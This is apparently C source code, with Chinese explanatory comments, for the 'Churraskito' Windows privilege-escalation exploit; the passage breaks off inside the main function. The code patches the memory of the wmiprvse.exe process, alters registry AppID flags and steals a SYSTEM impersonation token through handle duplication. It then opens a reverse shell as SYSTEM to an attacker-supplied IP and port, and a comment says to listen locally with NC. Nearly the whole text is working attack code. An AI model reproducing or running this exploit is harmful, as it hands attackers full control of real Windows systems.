
```c
HMODULE hMod;

DWORD cbNeeded;

//使用循环来猜 wmiprvse.exe 的句柄

for (DWORD i=0;i<0xffff;i+=4){
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, i );
    if (hProcess)
    {
        if ( EnumProcessModules( hProcess, &hMod, sizeof(hMod),    &cbNeeded) )
        {
            GetModuleBaseName( hProcess, hMod, szProcessName,
                              sizeof(szProcessName)/sizeof(TCHAR) );
            if (!strcmp(szProcessName,"wmiprvse.exe")){
               printf ("/Churraskito/-->Got WMI process Pid: %d <BR>",i);
               return hProcess;
            }
        }
        CloseHandle(hProcess);
    }
}

return 0;

}

void PatchProc(HANDLE hProc){
    DWORD dwOldProt;
    char Buff[]="\\xc2\\x04\\x00";
    char Buff2[]="\\x6a\\x0c\\x90";
    LPVOID lpAddress;
    VirtualProtectEx(hProc,CloseHandle,0x3,PAGE_EXECUTE_READWRITE,&dwOldProt);
    WriteProcessMemory(hProc,CloseHandle,Buff,0x3,NULL);
    VirtualProtectEx(hProc,CloseHandle,0x3,dwOldProt,&dwOldProt);
    lpAddress=(LPVOID)((DWORD)OpenThreadToken+0xb);
    VirtualProtectEx(hProc,lpAddress,0x3,PAGE_EXECUTE_READWRITE,&dwOldProt);
    WriteProcessMemory(hProc,lpAddress,Buff2,0x3,NULL);
    VirtualProtectEx(hProc,lpAddress,0x3,dwOldProt,&dwOldProt);
}

void RestoreProc(HANDLE hProc){
    DWORD dwOldProt;
    char Buff[]="\\xc2\\x04\\x00";
    VirtualProtectEx(hProc,CloseHandle,0x3,PAGE_EXECUTE_READWRITE,&dwOldProt);
    WriteProcessMemory(hProc,CloseHandle,Buff,0x3,NULL);
    VirtualProtectEx(hProc,CloseHandle,0x3,dwOldProt,&dwOldProt);
}

DWORD WINAPI ThreadProc(LPVOID lpParameter){
    while (1==1){
        InvokeWMI();
        Sleep(20000);
    }
}
```

//反弹 Shell 函数

```c
DWORD SpawnReverseShell(HANDLE hToken, DWORD dwPort,LPSTR sIP)
{
    HANDLE hToken2,hTokenTmp;
    PROCESS_INFORMATION pInfo;
    STARTUPINFO        sInfo;
    WSADATA wd;
    SOCKET sock;
    struct sockaddr_in sin;
    int size = sizeof(sin);
    memset(&sin, 0, sizeof(sin));
    WSAStartup(MAKEWORD( 1, 1 ), &wd);
    sock=WSASocket(PF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    sin.sin_family = AF_INET;
    bind(sock, (struct sockaddr*)&sin, size);
    sin.sin_port = htons(dwPort);
    sin.sin_addr.s_addr = inet_addr(sIP);
    DWORD dwRes=connect(sock, (struct sockaddr*)&sin, size);
    if (dwRes!=0){
        printf ("/Churraskito/-->Could not connect to %s<BR>",sIP);
        return 0;
    }
    //以上代码为反向连接的 shell，需要事先在本地用 NC 监听端口
    ZeroMemory(&sInfo, sizeof(STARTUPINFO));
    ZeroMemory(&pInfo, sizeof(PROCESS_INFORMATION));
    sInfo.cb= sizeof(STARTUPINFO);
    sInfo.lpDesktop= "WinSta0\\\\Default"; //so we don't have to wait on the process
    sInfo.dwFlags = STARTF_USESTDHANDLES;
    sInfo.hStdInput = sInfo.hStdOutput = sInfo.hStdError =(HANDLE) sock;
    CHAR cType;
    IsImpersonationToken(hToken, &cType);
    if (cType=='I'){
        SetThreadToken(NULL, hToken);
        OpenThreadToken(GetCurrentThread(),TOKEN_ALL_ACCESS,FALSE,&hTokenTmp);
        SetThreadToken(NULL, NULL);
    }
    else
        hTokenTmp=hToken;
    DuplicateTokenEx(hTokenTmp,MAXIMUM_ALLOWED,NULL,SecurityImpersonation, TokenPrimary,&hToken2) ;
    LPTSTR lpComspec;
    lpComspec= (LPTSTR) malloc(1024*sizeof(TCHAR));
    GetEnvironmentVariable("comspec",lpComspec,1024);//it won't work if cmd.exe used as commandline param
    dwRes=CreateProcessAsUser(hToken2, lpComspec ,NULL, NULL, NULL, TRUE, NULL, NULL, NULL, &sInfo, &pInfo);
    if (hTokenTmp!=hToken)
        CloseHandle(hTokenTmp);
    CloseHandle(hToken2);
    return dwRes;
}
```

```c
bool SetRegistryValues()
{
    HKEY hKey;
    DWORD x=0x0;
    bool result=false;
    //创建注册表{1F87137D-0E7C-44d5-8C73-4EFFB68962F2}
    if( RegCreateKeyEx(HKEY_USERS,TEXT("S-1-5-20_Classes\\\\AppID\\\\{1F87137D-0E7C-44d5-8C73-4EFFB68962F2}"),NULL,NULL,NULL,KEY_ALL_ACCESS,NULL, &hKey,NULL) == ERROR_SUCCESS )
    {
        if (RegSetValueEx(hKey,"AppIDFlags",NULL,REG_DWORD,(PBYTE)&x,sizeof(DWORD))== ERROR_SUCCESS )
        {
            result=true;
        }
    RegCloseKey(hKey);
    }
    return result;
}
```

```c
bool DelRegistrySubkeys()
{
    bool result=false;
    //删除注册表操作
    if( RegDeleteKey(HKEY_USERS,TEXT("S-1-5-20_Classes\\\\AppID\\\\{1F87137D-0E7C-44d5-8C73-4EFFB68962F2}")) == ERROR_SUCCESS )
    {
        if( RegDeleteKey(HKEY_USERS,TEXT("S-1-5-20_Classes\\\\AppID")) == ERROR_SUCCESS )
        {
            result=true;
        }
    }
    return result;
}
```

```c
int _tmain(int argc, _TCHAR* argv[])
{
    HANDLE hToken,hTokenOut;
    TCHAR UserName[32767];
    DWORD lpThreadId;
    DWORD dwPort;
    LPSTR sIP;
    HANDLE hProc;
    printf ("/Churraskito/-->This exploit gives you a Local System shell <BR>");
    //帮助提示 Usage()
    if (argc != 3) {
        printf ("/Churraskito/-->Usage: Churraskito.exe ipaddress port <BR>");
        return 0;
    }
    sIP= argv[1];
    dwPort= atoi(argv[2]);
    //写注册表操作
    //创建 HKU 下的 AppId\{1F87137D-0E7C-44d5-8C73-4EFFB68962F2}\AppIdFlags 为 0x0000000
    if (!SetRegistryValues()) {
        printf ("/Churraskito/-->Could not set registry values<BR>");
        return 0;
    }
    //创建一个线程线程执行 InvokeWMI()
    //由于下面要获取 wmiprvse.exe 进程句柄，所以需要先进行 wmi 操作
    CreateThread(NULL,NULL,ThreadProc,NULL,NULL,&lpThreadId);
    Sleep(500);            //等待 500 毫秒
    //获取句柄
    hProc=GetWMIProcHandle();
    //如果获取句柄成功
    if (hProc){
        PatchProc(hProc);
        while (1==1){
            for (DWORD j=0x4;j<=0x400;j+=4){
                //hToken 为 指定对象的现有句柄
                hToken=(HANDLE)j;
                //以 wmiprvse 的句柄来创建一个新句柄
                //该句柄有可能在其他进程
                if (DuplicateHandle(hProc,hToken,GetCurrentProcess(),&hTokenOut,0,FALSE,DUPLICATE_SAME_ACCESS )){
                    //
                    if (IsImpersonationToken(hTokenOut, NULL) ){
                        //获取新句柄的用户名
                        if(GetTokenUser(hTokenOut, UserName)){
                            printf ("/Churraskito/-->Found token %s <BR>",UserName);
                            if (!strcmp(UserName,"SYSTEM")){
                                DelRegistrySubkeys();      //删除注册表
                                printf ("/Churraskito/-->Running reverse shell<BR>");
                                //反向连接
                                SpawnReverseShell(hTokenOut,dwPort,sIP);
                                return 0;
                            }
                        }
                    }
                    CloseHandle(hTokenOut);
                }
            }
```
